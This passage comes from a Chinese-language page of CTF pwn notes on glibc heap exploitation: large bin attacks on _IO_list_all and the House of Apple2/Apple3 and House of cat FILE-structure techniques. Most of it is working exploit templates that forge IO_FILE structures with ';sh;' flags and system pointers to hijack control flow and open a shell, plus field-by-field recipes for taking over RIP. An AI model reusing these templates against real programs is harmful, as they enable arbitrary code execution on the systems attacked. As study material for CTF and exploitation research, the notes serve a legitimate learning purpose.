</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x6e0</span><span class=p>)</span>	<span class=c1># 2  	f90  , chunk 0 into large bin</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>			<span class=c1># 泄露libc基址, chunk 1地址, _IO_list_all地址, _IO_wfile_jumps地址</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 恢复</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span></span></span></code></pre></div></div></li></ul></li><li><p>large bin attack 劫持<code>_IO_list_all</code>为相应 large bin chunk，在该 large bin chunk 伪造</p><ul><li><p>可通过多次构建及释放堆块来劫持<code>bk_nextsize</code></p></li><li><p>如下使得编辑 chunk 4 即可修改 chunk 6 的<code>bk_nextsize</code>以及填入 fake IO_FILE 结构体</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x5e0</span><span class=p>)</span> <span class=c1># 3      290</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x800</span><span class=p>)</span> <span class=c1># 4 !    880</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=c1># chunk 3 -&gt; unsorted bin</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=c1># chunk 3,4 unlink to topchunk</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x5d0</span><span class=p>)</span> <span class=c1># 5      290</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x6e0</span><span class=p>)</span> <span class=c1># 6 !    870</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x500</span><span class=p>)</span> <span class=c1># 7      f60</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span> <span class=c1># 6 -&gt; unsorted bin</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x800</span><span class=p>)</span> <span class=c1># 8      1470    6 --&gt; largebin</span></span></span></code></pre></div></div></li><li><p>构造 fake 编辑 chunk 4</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># heap_addr 和 fake 的基地址均为 8a0</span>
</span></span><span class=line><span class=cl><span class=n>fake</span> <span class=o>=</span> <span class=n>flat</span><span class=p>({</span>
</span></span><span class=line><span class=cl>    <span class=c1># 此处实际填入到chunk1中，需要构造使得chunk1的size正确，于是填入0x6e1便于后续free</span>
</span></span><span class=line><span class=cl>    <span class=c1># 加入\x80等是为了字节对齐,也可b&#39;\x80\x80;sh;\x80\x80&#39;</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>:</span> <span class=p>[</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x80\x80</span><span class=s1>||sh</span><span class=se>\x00\x00</span><span class=s1>&#39;</span><span class=p>,</span> <span class=mh>0x6e1</span><span class=p>],</span> <span class=c1># _flags</span>
</span></span><span class=line><span class=cl>    <span class=mh>0xa0</span><span class=p>:</span> <span class=n>heap_addr</span> <span class=o>+</span> <span class=mh>0x200</span><span class=p>,</span> <span class=c1># _wide_data</span>
</span></span><span class=line><span class=cl>    <span class=mh>0xd8</span><span class=p>:</span> <span class=n>_IO_wfile_jumps_addr</span><span class=p>,</span> <span class=c1># vtable</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x2e0</span><span class=p>:</span> <span class=n>heap_addr</span> <span class=o>+</span> <span class=mh>0x400</span><span class=p>,</span> <span class=c1># _wide_vtable</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x468</span><span class=p>:</span> <span class=n>system_addr</span><span class=p>,</span> <span class=c1># doallocate</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x6e0</span><span class=p>:</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=p>},</span> <span class=n>filler</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>_IO_list_all_addr</span> <span class=o>-</span> <span class=mh>0x20</span><span class=p>)</span> <span class=c1># 控制chunk 6 bk_nextsize</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>fake</span> <span class=c1># fake IO_FILE struct</span>
</span></span><span class=line><span class=cl><span class=c1># 具体调试过程中绕过检查所需操作</span>
</span></span><span class=line><span class=cl><span class=c1># if (__glibc_unlikely (!prev_inuse(nextchunk)))</span>
</span></span><span class=line><span class=cl><span class=c1>#   malloc_printerr (&#34;double free or corruption (!prev)&#34;);</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x111</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xd00</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x6f0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span></span></span></code></pre></div></div></li><li><p>释放 chunk 1，并触发 largebin attack，劫持<code>_IO_list_all</code>为 chunk 1 即 8a0 结尾地址</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x800</span><span class=p>)</span></span></span></code></pre></div></div></li></ul></li><li><p>exit 退出触发</p></li></ul><p><strong>模板</strong></p><p>前两个标志，<code>prev_size</code>设置为<code>0xfbad1880</code>，<code>size</code>设置为<code>;sh;</code></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># file_addr为chunk地址</span>
</span></span><span class=line><span class=cl><span class=n>IO_wide_data_addr</span> <span class=o>=</span> <span class=p>(</span><span class=n>file_addr</span> <span class=o>+</span> <span class=mh>0xd8</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0xe0</span>
</span></span><span class=line><span class=cl><span class=n>wide_vtable_addr</span> <span class=o>=</span> <span class=p>(</span><span class=n>file_addr</span> <span class=o>+</span> <span class=mh>0xd8</span> <span class=o>+</span> <span class=mi>8</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x68</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_read_end</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_read_base</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_write_base</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>  <span class=c1># _IO_write_ptr</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_write_end</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_buf_base;</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_buf_end should usually be (_IO_buf_base + 1)</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span>  <span class=c1># from _IO_save_base to _markers</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># the FILE chain ptr</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>  <span class=c1># _fileno for stderr is 2</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _flags2, usually 0</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>  <span class=c1># _old_offset, -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _cur_column</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span>  <span class=c1># _vtable_offset</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>  <span class=c1># _shortbuf[1]</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># padding</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdout_&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x1ea0</span><span class=p>)</span>  <span class=c1># _IO_stdfile_1_lock</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>  <span class=c1># _offset, -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _codecvt, usually 0</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>IO_wide_data_addr</span><span class=p>)</span>  <span class=c1># _wide_data</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>3</span>  <span class=c1># from _freeres_list to __pad5</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0xFFFFFFFF</span><span class=p>)</span>  <span class=c1># _mode, usually -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>19</span>  <span class=c1># _unused2</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>=</span> <span class=n>fake_file</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xD8</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>  <span class=c1># adjust to vtable</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_wfile_jumps&#39;</span><span class=p>])</span>  <span class=c1># fake vtable</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>wide_vtable_addr</span><span class=p>)</span> <span class=c1># _wide_vtable</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>])</span> <span class=c1># doallocate</span></span></span></code></pre></div></div><p><strong>调用链</strong>：<code>_IO_wfile_overflow</code> > <code>_IO_wdoallocbuf</code> > <code>_IO_WDOALLOCATE</code> > <code>*(fp->_wide_data->_wide_vtable + 0x68)(fp)</code></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>wint_t</span> <span class=nf>_IO_wfile_overflow</span> <span class=p>(</span><span class=n>FILE</span> <span class=o>*</span><span class=n>f</span><span class=p>,</span> <span class=kt>wint_t</span> <span class=n>wch</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>f</span><span class=o>-&gt;</span><span class=n>_flags</span> <span class=o>&amp;</span> <span class=n>_IO_NO_WRITES</span><span class=p>){</span> <span class=c1>// 需要为0绕过
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>f</span><span class=o>-&gt;</span><span class=n>_flags</span> <span class=o>|=</span> <span class=n>_IO_ERR_SEEN</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=nf>__set_errno</span> <span class=p>(</span><span class=n>EBADF</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=n>WEOF</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>((</span><span class=n>f</span><span class=o>-&gt;</span><span class=n>_flags</span> <span class=o>&amp;</span> <span class=n>_IO_CURRENTLY_PUTTING</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span> <span class=c1>// 需要进入
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=o>||</span> <span class=n>f</span><span class=o>-&gt;</span><span class=n>_wide_data</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>f</span><span class=o>-&gt;</span><span class=n>_wide_data</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>	  <span class=nf>_IO_wdoallocbuf</span> <span class=p>(</span><span class=n>f</span><span class=p>);</span></span></span></code></pre></div></div><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>_IO_wdoallocbuf</span> <span class=p>(</span><span class=n>FILE</span> <span class=o>*</span><span class=n>fp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_wide_data</span><span class=o>-&gt;</span><span class=n>_IO_buf_base</span><span class=p>)</span> <span class=c1>// 需要_IO_buf_base为0
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_flags</span> <span class=o>&amp;</span> <span class=n>_IO_UNBUFFERED</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=kt>wint_t</span><span class=p>)</span><span class=nf>_IO_WDOALLOCATE</span> <span class=p>(</span><span class=n>fp</span><span class=p>)</span> <span class=o>!=</span> <span class=n>WEOF</span><span class=p>)</span> <span class=c1>// 调用vtable指针表
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=k>return</span><span class=p>;</span></span></span></code></pre></div></div><p><code>fp</code>设置</p><ul><li><code>_flags</code>设为<code>~(2 | 0x8 | 0x800)</code>，若不需要控制<code>rdi</code>，设置为<code>0</code>即可；若要获得<code>shell</code>，设为<code>;sh;</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li><li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data->_IO_write_base</code>设置为<code>0</code>，即<code>*(A + 0x18) = 0</code></li><li><code>_wide_data->_IO_buf_base</code>设置为<code>0</code>，即<code>*(A + 0x30) = 0</code></li><li><code>_wide_data->_wide_vtable</code>设置为可控堆地址<code>B</code>，即<code>*(A + 0xe0) = B</code></li><li><code>_wide_data->_wide_vtable->doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即<code>*(B + 0x68) = C</code></li></ul><p>② <code>_IO_wfile_underflow_mmap</code></p><p><strong>利用</strong></p><p><strong>调用链</strong>：<code>_IO_wfile_underflow_mmap</code> > <code>_IO_wdoallocbuf</code> > <code>_IO_WDOALLOCATE</code> > <code>*(fp->_wide_data->_wide_vtable + 0x68)(fp)</code></p><p>板子在 <code>_IO_wfile_overflow</code>基础上更改<code>libc.sym['_IO_wfile_jumps']+0xa8</code>即可，具体需要动态调试确定</p><p><strong>fp 构造</strong></p><ul><li><code>_flags</code>设为<code>~4</code>，若不控制<code>rdi</code>，设为<code>0</code>即可；若要获得<code>shell</code>，可设为<code>sh;</code>，注意前面有个空格</li><li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li><li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data->_IO_read_ptr >= _wide_data->_IO_read_end</code>，即满足<code>*A >= *(A + 8)</code></li><li><code>_wide_data->_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li><li><code>_wide_data->_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li><li><code>_wide_data->_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li><li><code>_wide_data->_wide_vtable->doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li></ul><p>③ <code>_IO_wdefault_xsgetn</code></p><p><strong>条件</strong>：调用到该函数时 rdx 寄存器(more)不为 0</p><p><strong>利用</strong></p><p><strong>调用链</strong>：<code>_IO_wdefault_xsgetn</code> -> <code>__wunderflow</code> -> <code>_IO_switch_to_wget_mode </code>-> <code>_IO_WOVERFLOW</code> -> <code>*(fp->_wide_data->_wide_vtable + 0x18)(fp)</code></p><p><strong>fp 设置</strong></p><ul><li><code>_flags</code>设置为<code>0x800</code></li><li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可。</li><li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) > 0</code></li><li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data->_IO_read_end == _wide_data->_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li><li><code>_wide_data->_IO_write_ptr > _wide_data->_IO_write_base</code>，即满足<code>*(A + 0x20) > *(A + 0x18)</code></li><li><code>_wide_data->_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li><li><code>_wide_data->_wide_vtable->overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li></ul><p>调整 fake vtable 处</p><p>④ <code>_IO_wfile_seekoff</code>：House of cat</p><p><strong>利用</strong></p><p><strong>调用链</strong>：<code>_IO_wfile_seekoff</code> > <code>_IO_switch_to_wget_mode</code> > <code>_IO_WOVERFLOW</code> > <code>*(fp->_wide_data->_wide_vtable + 0x18)(fp)</code></p><p><strong>构造 fp</strong></p><ul><li><p><code>_mode</code>不能为 0</p></li><li><p><code>_flags</code> 设置为 <code>~0x8</code>，如果不能保证 <code>_lock</code> 指向可读写内存则 <code>_flags |= 0x8000</code>。</p></li><li><p><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_seekoff</code>即可</p></li><li><p><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></p></li><li><p><code>_wide_data->_IO_write_ptr > _wide_data->_IO_write_base</code> ，即满足<code>*A > *(A + 8)</code></p></li><li><p><code>_wide_data->_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></p></li><li><p><code>_wide_data->_wide_vtable->overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></p></li></ul><h5 id=house-of-apple3>House of Apple3</h5><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=o>-</span> <span class=n>_IO_FILE_complete</span>
</span></span><span class=line><span class=cl>	<span class=o>|-</span> <span class=k>struct</span> <span class=n>_IO_codecvt</span> <span class=o>*</span><span class=n>_codecvt</span>
</span></span><span class=line><span class=cl>		<span class=o>|-</span><span class=n>_IO_iconv_t</span> <span class=n>__cd_in</span>
</span></span><span class=line><span class=cl>  		<span class=o>|-</span><span class=n>_IO_iconv_t</span> <span class=n>__cd_out</span>
</span></span><span class=line><span class=cl>  			<span class=o>|-</span><span class=k>struct</span> <span class=n>__gconv_step</span> <span class=o>*</span><span class=n>step</span>
</span></span><span class=line><span class=cl>  				<span class=o>|-</span><span class=k>struct</span> <span class=n>__gconv_loaded_object</span> <span class=o>*</span><span class=n>__shlib_handle</span>
</span></span><span class=line><span class=cl>  				<span class=o>|-</span><span class=p>....</span>
</span></span><span class=line><span class=cl>  				<span class=o>|-</span><span class=n>__gconv_fct</span> <span class=n>__fct</span>
</span></span><span class=line><span class=cl>  			<span class=o>|-</span><span class=k>struct</span> <span class=n>__gconv_step_data</span> <span class=n>step_data</span></span></span></code></pre></div></div><ul><li>利用<code>__libio_codecvt_out</code>、<code>__libio_codecvt_in</code>和<code>__libio_codecvt_length</code>函数</li></ul><p>① <code>_IO_wfile_underflow</code></p><p><strong>原理</strong></p><ul><li><code>_IO_wfile_underflow</code>函数中调用了<code>__libio_codecvt_in</code></li><li>且其为<code>_IO_wfile_jumps</code>这个<code>_IO_jump_t</code>类型变量的成员函数</li><li>伪造<code>FILE</code>结构体的<code>fp->vtable</code>为<code>_IO_wfile_jumps</code></li></ul><p><strong>调用链</strong>：<code>_IO_wfile_underflow</code> > <code>__libio_codecvt_in</code> > <code>DL_CALL_FCT</code> > <code>gs = fp->_codecvt->__cd_in.step</code> > <code>*(gs->__fct)(gs)</code></p><p><strong>fp 设置</strong></p><ul><li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow</code>即可</li><li><code>fp->_IO_read_ptr &lt; fp->_IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data->_IO_read_ptr >= _wide_data->_IO_read_end</code>，即满足<code>*A >= *(A + 8)</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt->__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li><li><code>codecvt->__cd_in.step->__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li><li><code>codecvt->__cd_in.step->__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制</li></ul><img src=/img/pwn_note.zh-cn.assets/image-20250126203031787.png alt=图片无法加载><p><strong>模板</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>file_addr</span> <span class=o>=</span> <span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x6d0</span>
</span></span><span class=line><span class=cl><span class=n>payload_addr</span> <span class=o>=</span> <span class=n>file_addr</span> <span class=o>+</span> <span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>codecvt_addr</span> <span class=o>=</span> <span class=n>file_addr</span> <span class=o>+</span> <span class=mh>0xe0</span>
</span></span><span class=line><span class=cl><span class=n>frame_addr</span> <span class=o>=</span> <span class=n>codecvt_addr</span> <span class=o>+</span> <span class=mi>5</span> <span class=o>*</span> <span class=mi>8</span>
